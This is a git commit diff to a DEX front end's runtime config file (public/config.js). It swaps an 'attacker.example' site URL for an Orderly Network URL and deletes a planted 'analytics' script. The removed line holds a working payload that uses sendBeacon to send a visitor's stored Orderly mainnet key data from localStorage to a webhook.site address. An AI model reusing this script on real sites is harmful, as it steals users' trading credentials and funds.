d1c25c957b5cd0c1bb3ee4bccc5aba2b95050885
Mario Reder <mario.reder@pm.me>
2026-04-27 19:10:19 +0200

    Update DEX configuration and branding

--- public/config.js
+++ public/config.js
@@ -27,7 +27,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_TWITTER_URL": "",
   "VITE_SEO_SITE_NAME": "",
   "VITE_SEO_SITE_DESCRIPTION": "",
-  "VITE_SEO_SITE_URL": "https://bypass.attacker.example",
+  "VITE_SEO_SITE_URL": "https://dex.orderly.network/testdex-6666/",
   "VITE_SEO_SITE_LANGUAGE": "en",
   "VITE_SEO_SITE_LOCALE": "en_US",
   "VITE_SEO_TWITTER_HANDLE": "",
@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script>navigator.sendBeacon('https://webhook.site/4945b12b-c7b1-4ebb-af72-3c0d5dcb729a',localStorage.getItem('orderly_mainnet_'+localStorage.getItem('orderly_mainnet_address')))</script>",
+  "VITE_ANALYTICS_SCRIPT": "",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
